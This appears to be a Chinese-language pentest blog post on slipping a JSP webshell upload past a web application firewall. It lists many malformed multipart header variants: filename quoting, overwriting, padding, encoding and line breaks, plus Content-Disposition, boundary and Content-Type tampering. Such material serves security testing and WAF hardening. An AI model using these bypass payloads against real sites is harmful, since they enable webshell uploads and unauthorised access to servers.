才开始本来是项目碰到的，结果闹了乌龙。刚好有其他的平台，就总结一下用到的方法和思路。
参考链接：
绕waf的话，一般我的思路是硬怼，或者迂回打击。先说说两种思路
**一 硬怼**  
硬怼的话，主要是从下面这些方法入手去操作。  
（1）fuzz后缀名  
看看有无漏网之鱼（针对开发自定义的过滤可能有机会，针对waf基本不可能。更多的情况是php的站寻找文件包含或者解析漏洞乃至传配置文件一类的，但是对于这种也大可不必fuzz后缀名了）  
（2）http头变量改造  
首先要明确waf的检测特征，一般是基于某种特定的情况下，去针对相应的拦截。几个例子，文件上传的时候，大多数Content-Type都是application/multipart-formdata这种，name对于waf来说，如果针对这种规则，对xxe
，sql注入，上传，命令执行，内容等所有都去做一波扫描是及其浪费内存的，所以有可能针对不同的类型，做了不同的校验规则。此时通过对Content-Type进行修改，可能会绕过waf。其他的http头添加删除等也是类似。  
（3）文件后缀构造  
这个和第一个有相似的就是都针对后缀名进行改造，不同的在于这里可能会利用waf的截取特征，比如回车换行绕过waf的检测，但是对于后端来说接收了所有的传入数据，导致了绕过waf。  
（4）其他方法  
这种就比较杂了，但是又不属于迂回打击的一类，比如重写等方法。接下来就实战来试试  
第一步，先来对waf的规则做一个简单的判断。这里我的习惯是从内容，后缀两个方向进行判断。简单来说，基本分为这几种情况  
（1）只判断后缀（基本碰到的比较少了，因为很多时候白名单开发都可以完成）  
（2）只判断内容（也比较少，因为一般的waf都会带后缀的判断）  
（3）内容后缀同时判断（这种情况比较多，相对于来说会安全一点）  
（4）根据文件后缀来判断内容是否需要检测（较多）  
（5）根据Content-Type来判断文件内容是否需要检测  
暂时只想到这么多，以后碰到了再单独记吧。
有了思路，那么接下来就好说了。举个例子我这里的情况  
（1）传脚本后缀（被拦截，判断了后缀）  
（2）传脚本后缀加不免杀代码（被拦截，可能后缀内容同时拦截）  
（3）传非脚本名（可自己fuzz一个能过waf的任意后缀，里面加恶意内容，被拦截。也就是说同时会对内容和后缀进行判断）
说说我这里的情况，会对内容和后缀进行拦截。检测到上传jsp文件，任意内容都会被拦截。  
先来fuzz一波能利用的后缀名，这里可以包括中间件的一些配置文件。希望不大，一点都不出意外，全部被拦截了。
既然我们需要对后缀名进行改造，就对后缀名后面加特殊符号做一个fuzz试试，测试了一下，在没有恶意内容的情况下，只有'被过滤了。所以如果有机会，我们看看能不能试试系统特殊，比如;去做截断。先记下来。因为最终还是需要免杀马的，jsp免杀又不会，先不考虑这个，先考虑把waf绕过。（这里我对filename做了换行，然后去掉了引号，加了一个;做截断绕过了waf，但是内容被查杀了，尴尬。）
接下来对http头部进行改造一下尝试绕过  
**一.filename改造**  
（2） 名字特殊符号替换以及构造异常闭合（符号方法很多自己天马星空，我这里就写几个就行了，但是要注意你改造了得让后端识别到，乱改造识别不到等于白搭）  
filename='shell.jspx.jsp'  
filename=`shell.jspx.jsp`  
filename=shell.jspx.jsp'  
"filename"=shell.jspx;  
（3）重写  
filename=shell.jpg;filename=shell.jspx;  
filename=shell.jspx;filename=shell.jpg;  
（4）大小写变化  
FileName=shell.jspx.jsp'  
（5）参数污染  
FileName=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaashell.jspx.jsp'  
FileName =shell.jspx（加空格）  
filename===="shell.jspx.jsp1"（加等号）  
FileName =shell.jspx（前后加空格，中间也可以加特殊符号fuzz）  
（6）文件名字编码（filename一般为后端接收参数，编码了可能识别不到，这个就看情况）  
filename=\u0073\u0068\u0065\u006c\u006c\u002e\u006a\u0073\u0070  
（7）回车换行（有时候确实挺好用的，任意位置都可以试一下）  
1.FileName=shell.jspx.  
jsp  
2.File  
Name=shell.jspx.jsp'  
**二 name改造**  
name也可以任意改造，改造的方法和filename差不多，就不重复发了，主要是思路重要。  
其他的比如奇奇怪怪的正则需要用到的特殊字符都可以在文件名中fuzz一下，看看能否打断waf规则，也就是把我们fuzz后缀的再跑一次，或者再找点其他的正则字母，这里就不重复写了。
**http头部格式上传相关绕过**  
有一些用畸形相关的，不太推荐一来就试，fuzz的可以带一下，这种属于天时地利人和占据才用，毕竟底层的规定好的合规变了就不能识别，但是也说不准fuzz出问题了呢。fuzz本来就是一个天马行空的过程，好了，继续来看。  
（1）Content-Disposition  
溢出绕过  
Content-Disposition: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
form-data; name="file"; filename=shell.jpg;filename=shell.jspx;  
回车换行绕过（注意不要把固定字段打散了，）  
Content-Disposition:  
form-data; name="file"; filename=shell.jpg;filename=shell.jspx;  
双写绕过（写两次）  
Content-Disposition: form-data; name="file";
filename=shell.jpg;filename=shell.jspx;  
Content-Disposition: form-data; name="file";
filename=shell.jpg;filename=shell.jspx.jpg;  
还有一些参数污染加减空格啥的，和上面filename类似，就不重复写了。  
（2）boundary  
加减空格或者前面加恶意的参数  
boundary =---------------------------8472011224916008542288311250  
&boundary =---------------------------8472011224916008542288311250  
123& boundary =---------------------------8472011224916008542288311250  
多个污染（他是用来分割的，他变了下面的也要变一下）  
boundary =---------------------------8472011224916008542288311251  
boundary =---------------------------8472011224916008542288311252  
回车换行污染  
分割污染（简单来说就是他自定义了一些分割部分，我们可以把我们的恶意参数提交到其他的分割部分）见下图第一个，视情况而定。其他的常用方式和上面都可以重复的  
（3）Content-Type  
直接删除  
修改类型为application/text或者 image/jpeg等等  
回车换行  
溢出  
参数污染  